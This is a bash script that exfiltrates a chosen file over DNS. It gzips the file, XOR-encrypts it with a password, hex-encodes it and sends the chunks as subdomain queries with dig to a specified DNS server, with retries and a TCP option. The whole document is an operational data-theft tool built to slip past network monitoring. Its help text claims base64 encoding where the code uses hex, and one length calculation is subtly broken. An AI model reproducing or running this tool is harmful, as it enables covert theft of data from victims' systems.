#!/bin/bash

function show_help {
    echo "Usage: ./exfil_client.sh -f <file_path> -p <password> [-d <domain>] [-s <dns_server_ip>] [-t]"
    echo "Exfiltrates a file over DNS by sending XOR-encrypted, base64 encoded chunks as DNS queries."
    echo ""
    echo "Parameters:"
    echo "  -f  Path to the file you want to exfiltrate."
    echo "  -p  Password to be used in XOR encryption."
    echo "  -d  Domain to use in DNS queries."
    echo "  -s  IP address of the DNS server."
    echo "  -t  Use TCP instead of UDP."
    echo ""
    echo "Example:"
    echo './exfil_client.sh -f "/path/to/your/file" -d "example.com" -s "8.8.8.8" -p "securepass" -t'
}

while getopts "f:p:d:s:th" opt; do
    case ${opt} in
        f ) FilePath=$OPTARG ;;
        p ) Password=$OPTARG ;;
        d ) Domain=$OPTARG ;;
        s ) DnsServerIp=$OPTARG ;;
        t ) UseTcp=true ;;
        h ) show_help
            exit 0 ;;
        \? ) show_help
             exit 1 ;;
    esac
done

if [[ -z "$FilePath" || -z "$Password" || ! -f "$FilePath" ]]; then
    show_help
    exit 1
fi

# Get filename from FilePath
filename=$(basename "$FilePath")

# Calculate MD5 checksum
echo "[+] MD5 checksum: [$(md5sum $FilePath)]"

# Generate timestamp in format yyyyMMddHHmmss
timestamp=$(date +"%Y%m%d%H%M%S")

echo "[*] Encrypting file, please wait..."
# XOR encrypt compressed data with password
encrypted_data=$(gzip -c "$FilePath" | xortool-xor -n -s "$Password" -f - | hexdump -v -e '/1 "%02x"' )

# Maximum DNS query size constraints
label_max_size=63
request_max_size=235

# Calculate space required for domain name and metadata
domain_name_length=${#Domain}+3
metadata_length=$(((${#filename} + ${#timestamp}) * 2))

# Calculate maximum bytes available for data in each DNS query
bytes_left=$((request_max_size - metadata_length - domain_name_length))

# Calculate number of chunks
nb_chunks=$(((${#encrypted_data} + bytes_left - 1) / bytes_left))

echo "[+] Maximum data exfiltrated per DNS request (chunk max size): [$bytes_left] bytes"
echo "[+] Number of chunks: [$nb_chunks]"

# Split encrypted data into chunks and send DNS queries
chunk_id=0
start_index=0

echo "[*] Sending file, please wait..."

while [[ $chunk_id -lt $nb_chunks ]]; do
    end_index=$((start_index + bytes_left))
    chunk=${encrypted_data:$start_index:bytes_left}

    # Split chunk into 4 equal chunks
    chunk_length=$(((${#chunk} + 3) / 4))
    chunks=()
    for ((i = 0; i < 4; i++)); do
        chunks[$i]=${chunk:$((i * chunk_length)):chunk_length}
    done

    # Construct DNS query
    encrypted_filename=$(echo -n "$filename" | xortool-xor -n -s "$Password" -f - | xxd -p )
    metadata="$encrypted_filename|$timestamp|$nb_chunks"
    subdomain="$chunk_id.${chunks[0]}.${chunks[1]}.${chunks[2]}.${chunks[3]}.$metadata.$Domain"

    # Retry logic for DNS query
    max_retries=5
    retry_count=0
    success=false

    while [[ $retry_count -lt $max_retries && $success == false ]]; do
        if [[ "$UseTcp" = true ]]; then
            dig_output=$(dig +tcp +short "$subdomain" @"$DnsServerIp" 2>&1)
        else
            dig_output=$(dig +short "$subdomain" @"$DnsServerIp" 2>&1)
        fi

        if [[ ! "$dig_output" == *"connection refused"* ]]; then
            success=true
        else
            retry_count=$((retry_count + 1))
            echo "[*] Timeout occurred, retrying $retry_count/$max_retries..."
            sleep 3
        fi
    done

    if [[ $success == false ]]; then
        echo "[!] Failed to send DNS query after multiple retries."
        exit 1
    fi

    printf "%4d%%\r" $((100 * chunk_id / nb_chunks))

    # Move to next chunk
    chunk_id=$((chunk_id + 1))
    start_index=$end_index
done

echo "[+] Transfer complete!"
